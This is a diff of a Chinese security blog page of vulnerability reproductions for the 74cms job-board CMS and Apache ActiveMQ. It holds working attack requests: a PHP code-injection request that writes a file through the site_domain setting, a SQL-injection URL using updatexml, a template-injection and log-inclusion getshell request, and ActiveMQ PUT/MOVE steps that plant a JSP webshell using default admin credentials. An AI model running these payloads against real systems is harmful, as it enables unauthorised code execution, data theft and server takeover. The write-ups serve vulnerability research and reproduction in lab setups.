@@ -259,7 +259,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -272,7 +272,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/12/74cms%20v5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/" class="post-title-link" itemprop="url">74cms v5.0.1远程执行代码</a>
+          <a href="/2021/01/12/74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">74cms v5.0.1 前台sql注入</a>
         </h2>
 
         <div class="post-meta-container">
@@ -284,7 +284,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:30:24" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：17:04:11" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -307,209 +307,18 @@
     
     <div class="post-body" itemprop="articleBody">
           <a id="more"></a>
-<h1 id="74cms-v5-0-1远程执行代码"><a href="#74cms-v5-0-1远程执行代码" class="headerlink" title="74cms v5.0.1远程执行代码"></a>74cms v5.0.1远程执行代码</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>74cms v5.0.1</p>
-<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="/resource/74cmsv5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/media/rId25.png"></p>
-<pre><code>POST /74cms/index.php?m=Admin&amp;c=config&amp;a=edit HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
-Accept: application/json, text/javascript, */*; q=0.01
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Referer: http://127.0.0.1/74cms/index.php?m=Admin&amp;c=Config&amp;a=index
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-X-Requested-With: XMLHttpRequest
-Content-Length: 391
-Connection: close
-Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
-
-site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&amp;site_domain=127.0.0.1&amp;site_dir=%2F74cms%2F&amp;top_tel=000-00000000&amp;bootom_tel=000-00000000&amp;contact_email=&amp;address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&amp;bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&amp;icp=icp000000000&amp;isclose=0&amp;close_reason=&amp;statistics=&amp;logo_home=&amp;logo_other=</code></pre>
-<p>c=config&amp;a=edit -&gt; Controller=config&amp;action=edit -&gt;<br>/Application/Admin/Controller/ConfigController.class.php Line 9:<br>I(&#39;request.site_domain&#39;,&#39;&#39;,&#39;trim&#39;) -&gt; trim($site_domain,&#39;/&#39;)<br>-&gt; &#39;.&#39;.implode(&#39;.&#39;,$domain) -&gt; array(&#39;domain&#39;=&gt;$domain) -&gt;<br>$this-&gt;update_config($config,CONF_PATH.&#39;url.php&#39;)</p>
-<pre><code>public function edit()&#123;
-       if(IS_POST)&#123;
-           $site_domain = I(&#39;request.site_domain&#39;,&#39;&#39;,&#39;trim&#39;);
-           $site_domain = trim($site_domain,&#39;/&#39;);
-           $site_dir = I(&#39;request.site_dir&#39;,C(&#39;qscms_site_dir&#39;),&#39;trim&#39;);
-           $site_dir = $site_dir==&#39;&#39;?&#39;/&#39;:$site_dir;
-           $site_dir = $site_dir==&#39;/&#39;?$site_dir:(&#39;/&#39;.trim($site_dir,&#39;/&#39;).&#39;/&#39;);
-           $_POST[&#39;site_dir&#39;] = $site_dir;
-           if($site_domain &amp;&amp; $site_domain != C(&#39;qscms_site_domain&#39;))&#123;
-               if($site_domain == C(&#39;qscms_wap_domain&#39;))&#123;
-                   $this-&gt;returnMsg(0,&#39;主域名不能与触屏版域名重复！&#39;);
-               &#125;
-               $str = str_replace(&#39;http://&#39;,&#39;&#39;,$site_domain);
-               $str = str_replace(&#39;https://&#39;,&#39;&#39;,$str);
-               if(preg_match(&#39;/com.cn|net.cn|gov.cn|org.cn$/&#39;,$str) === 1)&#123;
-                   $domain = array_slice(explode(&#39;.&#39;, $str), -3, 3);
-               &#125;else&#123;
-                   $domain = array_slice(explode(&#39;.&#39;, $str), -2, 2);
-               &#125;
-               $domain = &#39;.&#39;.implode(&#39;.&#39;,$domain);
-               $config[&#39;SESSION_OPTIONS&#39;] = array(&#39;domain&#39;=&gt;$domain);
-               $config[&#39;COOKIE_DOMAIN&#39;] = $domain;
-               $this-&gt;update_config($config,CONF_PATH.&#39;url.php&#39;);
-           &#125;</code></pre>
-<p>/ThinkPHP/Common/functions.php第271行中的I（&#39;request.site_domain&#39;，&#39;&#39;，&#39;trim&#39;）是字符串。request.site_domain-&gt;<br>$ _REQUEST [&#39;site_domain&#39;]-&gt; $ _ REQUEST<br>[&#39;site_domain&#39;]是字符串-&gt;修剪（$ _REQUEST [&#39;site_domain&#39;]）</p>
-<pre><code>function I($name,$default=&#39;&#39;,$filter=null,$datas=null) &#123;
-    ...
-    if(strpos($name,&#39;.&#39;)) &#123; // 指定参数来源
-        list($method,$name) =   explode(&#39;.&#39;,$name,2);
-    &#125;else&#123; // 默认为自动判断
-        $method =   &#39;param&#39;;
-    &#125;
-    switch(strtolower($method)) &#123;
-        case &#39;get&#39;     :   
-            $input =&amp; $_GET;
-            break;
-        case &#39;post&#39;    :   
-            $input =&amp; $_POST;
-            break;
-        ...
-        case &#39;request&#39; :   
-            $input =&amp; $_REQUEST;   
-            break;
-        ...
-    &#125;
-    if(&#39;&#39;==$name) &#123; // 获取全部变量
-      ...
-        &#125;
-    &#125;elseif(isset($input[$name])) &#123; // 取值操作
-        $data       =   $input[$name];
-        $filters = isset($filter) ? $filter.&#39;,&#39;.C(&#39;DEFAULT_FILTER&#39;) : C(&#39;DEFAULT_FILTER&#39;);
-        //$filters    =   isset($filter)?$filter:C(&#39;DEFAULT_FILTER&#39;);
-        if($filters) &#123;
-            if(is_string($filters))&#123;
-                if(0 === strpos($filters,&#39;/&#39;))&#123;
-                    if(1 !== preg_match($filters,(string)$data))&#123;
-                        // 支持正则验证
-                        return   isset($default) ? $default : null;
-                    &#125;
-                &#125;else&#123;
-                    $filters    =   explode(&#39;,&#39;,$filters);                    
-                &#125;
-            &#125;elseif(is_int($filters))&#123;
-                $filters    =   array($filters);
-            &#125;
-
-            if(is_array($filters))&#123;
-                foreach($filters as $filter)&#123;
-                    if(function_exists($filter)) &#123;
-                        $data   =   is_array($data) ? array_map_recursive($filter,$data) : $filter($data); // 参数过滤
-                    &#125;else&#123;
-                        $data   =   filter_var($data,is_int($filter) ? $filter : filter_id($filter));
-                        if(false === $data) &#123;
-                            return   isset($default) ? $default : null;
-                        &#125;
-                    &#125;
-                &#125;
-            &#125;
-        &#125;
-        if(!empty($type))&#123;
-          ...
-    &#125;else&#123; // 变量默认值
-        $data       =    isset($default)?$default:null;
-    &#125;
-    is_array($data) &amp;&amp; array_walk_recursive($data,&#39;think_filter&#39;);
-    return $data;
-&#125;</code></pre>
-<p>返回到/Application/Admin/Controller/ConfigController.class.php第29行：array（&#39;SESSION_OPTIONS&#39;=&gt;<br>array（&#39;domain&#39;=&gt; $ domain），&#39;COOKIE_DOMAIN&#39;=&gt; $ domain） -&gt;<br>update_config（$ config， CONF_PATH.&#39;url.php&#39;）</p>
-<pre><code>$config[&#39;SESSION_OPTIONS&#39;] = array(&#39;domain&#39;=&gt;$domain);
-$config[&#39;COOKIE_DOMAIN&#39;] = $domain;
-$this-&gt;update_config($config,CONF_PATH.&#39;url.php&#39;);</code></pre>
-<p>/Application/Common/Controller/BackendController.class.php第467<br>行中的update_config（$ config，CONF_PATH.&#39;url.php&#39;）：</p>
-<p>multimerge（$ config，$ new_config） -&gt; file_put_contents（$<br>config_file，” &lt;？php \ nreturn”。stripslashes（var_export（$<br>config，true））。”;”，LOCK_EX）</p>
-<pre><code>    public function update_config($new_config, $config_file = &#39;&#39;) &#123;
-        !is_file($config_file) &amp;&amp; $config_file = HOME_CONFIG_PATH . &#39;config.php&#39;;
-        if (is_writable($config_file)) &#123;
-            $config = require $config_file;
-            $config = multimerge($config, $new_config);
-            if($config[&#39;SESSION_OPTIONS&#39;])&#123;
-                $config[&#39;SESSION_OPTIONS&#39;][&#39;path&#39;] = SESSION_PATH;
-            &#125;
-            file_put_contents($config_file, &quot;&lt;?php \nreturn &quot; . stripslashes(var_export($config, true)) . &quot;;&quot;, LOCK_EX);
-            @unlink(RUNTIME_FILE);
-            return true;
-        &#125; else &#123;
-            return false;
-        &#125;
-    &#125;
-&#125;</code></pre>
-<p>multimerge($config, $new_config) in<br>/Application/Common/Common/function.php Line 938: no restricted</p>
-<pre><code>function multimerge($a, $b) &#123;
-    if (is_array($b) &amp;&amp; count($b)) &#123;
-        foreach ($b as $k =&gt; $v) &#123;
-            if (is_array($v) &amp;&amp; count($v)) &#123;
-                $a[$k] = in_array($k, array(&#39;SESSION_OPTIONS&#39;)) ? multimerge($a[$k], $v) : $v;
-            &#125; else &#123;
-                $a[$k] = $v;
-            &#125;
-        &#125;
-    &#125; else &#123;
-        $a = $b;
-    &#125;
-    return $a;
-&#125;</code></pre>
-<p>CONF_PATH in /ThinkPHP/ThinkPHP.php Line 54: CONF_PATH.&#39;url.php&#39; -&gt;<br>/Application/Common/Conf/url.php</p>
-<pre><code>defined(&#39;COMMON_PATH&#39;)  or define(&#39;COMMON_PATH&#39;,    APP_PATH.&#39;Common/&#39;); // 应用公共目录
-defined(&#39;CONF_PATH&#39;)    or define(&#39;CONF_PATH&#39;,      COMMON_PATH.&#39;Conf/&#39;);
-define(&#39;APP_PATH&#39;,&#39;./Application/&#39;);</code></pre>
-<p>var_export(): Quote string with slashes&amp;Convert special characters to<br>HTML entities -&gt; stripslashes(): un-quotes a quoted string -&gt; Convert<br>special characters to HTML entities -&gt; write file</p>
-<pre><code>file_put_contents($config_file, &quot;&lt;?php \nreturn &quot; . stripslashes(var_export($config, true)) . &quot;;&quot;,LOCK_</code></pre>
-<p>/Application/Home/Conf/url.php: The code after &quot;return array(...);&quot;<br>does not work, so payload is site_domain=&#39;, {your php code},&#39;</p>
-<pre><code>&lt;?php 
-return array (
-  &#39;URL_MODEL&#39; =&gt; 0,
-  &#39;URL_HTML_SUFFIX&#39; =&gt; &#39;.html&#39;,
-  &#39;URL_PATHINFO_DEPR&#39; =&gt; &#39;/&#39;,
-  &#39;URL_ROUTER_ON&#39; =&gt; true,
-  &#39;URL_ROUTE_RULES&#39; =&gt; 
-  array (
-    &#39;/^jobfair\/(?!admin)(\w+)$/&#39; =&gt; &#39;jobfair/index/:1&#39;,
-    &#39;/^mall\/(?!admin)(\w+)$/&#39; =&gt; &#39;mall/index/:1&#39;,
-  ),
-  &#39;QSCMS_VERSION&#39; =&gt; &#39;5.0.1&#39;,
-  &#39;QSCMS_RELEASE&#39; =&gt; &#39;2019-03-19 00:00:00&#39;,
-  &#39;SESSION_OPTIONS&#39; =&gt; 
-  array (
-    &#39;domain&#39; =&gt; &#39;.0.1&#39;,
-    0 =&gt; 18,
-    1 =&gt; &#39;&#39;,
-    &#39;path&#39; =&gt; &#39;D:\***\***\***\WWW\74cms\data\session&#39;,
-  ),
-  &#39;COOKIE_DOMAIN&#39; =&gt; &#39;.0.1&#39;,
-  0 =&gt; 18,
-  1 =&gt; &#39;&#39;,
-);</code></pre>
-<h3 id="复现poc"><a href="#复现poc" class="headerlink" title="复现poc"></a>复现poc</h3><p>-&gt; PD9waHAgcGhwaW5mbygpOz8+</p>
-<p>site_domain=&#39;,<br>file_put_contents(&#39;403.php&#39;,base64_decode(&#39;PD9waHAgcGhwaW5mbygpOz8+&#39;)),&#39;</p>
-<pre><code>POST /74cms/index.php?m=Admin&amp;c=config&amp;a=edit HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
-Accept: application/json, text/javascript, */*; q=0.01
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Referer: http://127.0.0.1/74cms/index.php?m=Admin&amp;c=Config&amp;a=index
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-X-Requested-With: XMLHttpRequest
-Content-Length: 465
-Connection: close
-Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
-
-site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&amp;site_domain=&#39;%2C+file_put_contents(&#39;403.php&#39;%2Cbase64_decode(&#39;PD9waHAgcGhwaW5mbygpOz8%2B&#39;))%2C&#39;&amp;site_dir=%2F74cms%2F&amp;top_tel=000-00000000&amp;bootom_tel=000-00000000&amp;contact_email=&amp;address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&amp;bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&amp;icp=icp000000000&amp;isclose=0&amp;close_reason=&amp;statistics=&amp;logo_home=&amp;logo_other=
-GET /74cms/Application/Common/Conf/url.php HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Connection: close
-Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
-Upgrade-Insecure-Requests: 1
-Cache-Control: max-age=0</code></pre>
-<p>成功截图</p>
-<p><img src="/resource/74cmsv5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/media/rId27.png"></p>
-<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md">https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md</a></p>
-</blockquote>
+<h1 id="74cms-v5-0-1-前台sql注入"><a href="#74cms-v5-0-1-前台sql注入" class="headerlink" title="74cms v5.0.1 前台sql注入"></a>74cms v5.0.1 前台sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>74cms 5.0.1 前台AjaxPersonalController.class.php存在SQL注入</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="具体信息"><a href="#具体信息" class="headerlink" title="具体信息"></a>具体信息</h3><p>文件位置：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php</p>
+<p>方法：function company_focus($company_id)</p>
+<p>是否需登录：需要</p>
+<p>登录权限：普通用户即可</p>
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload:"></a>Payload:</h3><pre><code>http://0-sec.org/74cms/5.0.1/upload/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus&amp;company_id[0]=match&amp;company_id[1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a</code></pre>
+<p><img src="/images/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId26.png"></p>
+<h3 id="源码分析："><a href="#源码分析：" class="headerlink" title="源码分析："></a>源码分析：</h3><p>文件：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php</p>
+<p>company_focus<br>方法是参数化函数，$company_id参数是不经过I函数过滤的，所以只要where可以控制，那就可以注入</p>
+<p><img src="/images/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
+<p>跟踪add_focus(),发现SQL语句参数外部都可以控制，导致了注入漏洞</p>
+<p><img src="/images/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId29.png"></p>
 
       
     </div>
@@ -637,7 +446,7 @@ Cache-Control: max-age=0</code></pre>
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:30:44" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：17:05:34" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -667,17 +476,17 @@ Cache-Control: max-age=0</code></pre>
 <p><strong>0x04 环境搭建</strong></p>
 <p>骑士cms不支持php7.0，所以建议使用php5</p>
 <p>官网下载6.0.20版本</p>
-<p><img src="resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/image-20201214112017128.png" alt="image-20201214112017128"></p>
+<p><img src="/images/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/image-20201214112017128.png" alt="image-20201214112017128"></p>
 <p>将源码放在web根目录下，访问/index.php进行安装</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.发送如下请求：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php?m&#x3D;home&amp;a&#x3D;assign_resume_tpl</span><br><span class="line">POST:</span><br><span class="line">variable&#x3D;1&amp;tpl&#x3D;&lt;?php phpinfo(); ob_flush();?&gt;&#x2F;r&#x2F;n&lt;qscms&#x2F;company_show 列表名&#x3D;&quot;info&quot; 企业id&#x3D;&quot;$_GET[&#39;id&#39;]&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640.png" alt="img"></p>
+<p><img src="/images/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640.png" alt="img"></p>
 <p>查看日志会发现已经记录了错误<br>位置：\phpstudy_pro\WWW\data\Runtime\Logs\Home</p>
-<p><img src="resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640-20201214112713818.png" alt="img"></p>
+<p><img src="/images/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640-20201214112713818.png" alt="img"></p>
 <p>3.包含日志</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php?m&#x3D;home&amp;a&#x3D;assign_resume_tpl</span><br><span class="line">POST:</span><br><span class="line">variable&#x3D;1&amp;tpl&#x3D;data&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;20_12_12.log</span><br></pre></td></tr></table></figure>
 <p>日志名称就是当天的年月日，直接包含即可</p>
-<p><img src="resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640-20201214112801787.png" alt="img"></p>
+<p><img src="/images/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640-20201214112801787.png" alt="img"></p>
 <p>为什么不能使用get来请求，因为url在提交给后台处理会被进行url编码，从而造成包含不成功，因此要采取post方式发送payload</p>
 
       
@@ -985,200 +794,6 @@ end</code></pre>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/%EF%BC%88CVE-2016-3088%EF%BC%89ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="nicaishui">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="隐秘行动">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/12/%EF%BC%88CVE-2016-3088%EF%BC%89ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">（CVE-2016-3088）ActiveMQ应用漏洞</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:21:47" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <a id="more"></a>
-
-<h1 id="（CVE-2016-3088）ActiveMQ应用漏洞"><a href="#（CVE-2016-3088）ActiveMQ应用漏洞" class="headerlink" title="（CVE-2016-3088）ActiveMQ应用漏洞"></a>（CVE-2016-3088）ActiveMQ应用漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>ActiveMQ是一款流行的开源消息服务器。默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。</p>
-<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache ActiveMQ 5.x ~ 5.14.0</p>
-<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞是需要登录之后才可以执行</p>
-<p>漏洞利用就是/fileserver/有put上传权限，/admin/有执行权限，可找到绝对路径，使用move移动文件到/admin/</p>
-<p>下面就是两步走，先是利用put上传文件到/fileserver/,然后移动到move到admin下面</p>
-<p>所有返回为204就代表是成功，有个坑点：不要put同文件名的文件上去</p>
-<p>如果上传不解析的话，则是证明没有权限！！！</p>
-<p>如果上传不解析的话，则是证明没有权限！！！</p>
-<p>如果上传不解析的话，则是证明没有权限！！！</p>
-<p>ActiveMQ默认开启PUT方法，当fileserver存在时我们可以上传jspwebshell。</p>
-<p><img src="./resource/(CVE-2016-3088)ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
-<pre><code>PUT /fileserver/shell.jsp HTTP/1.1
-Host: 192.168.197.25:8161
-User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-Authorization: Basic YWRtaW46YWRtaW4=
-
-shell</code></pre>
-<p>利用 MOVE 方法将 Webshell 移入 admin/ 目录</p>
-<p><img src="./resource/(CVE-2016-3088)ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
-<pre><code>Request Raw:
-MOVE /fileserver/shell.jsp HTTP/1.1
-Destination:file:/data/apache-activemq-5.7.0/webapps/admin/shell.jsp
-Host: 192.168.197.25:8161
-User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-Authorization: Basic YWRtaW46YWRtaW4=
-Content-Length: 17
-Content-Length: 0
-
-shell</code></pre>
-<p><img src="./resource/(CVE-2016-3088)ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/%EF%BC%88CVE-2017-15709%EF%BC%89ActiveMQ%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="nicaishui">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="隐秘行动">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/12/%EF%BC%88CVE-2017-15709%EF%BC%89ActiveMQ%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">（CVE-2017-15709）ActiveMQ 信息泄漏漏洞</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:21:59" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <a id="more"></a>
-
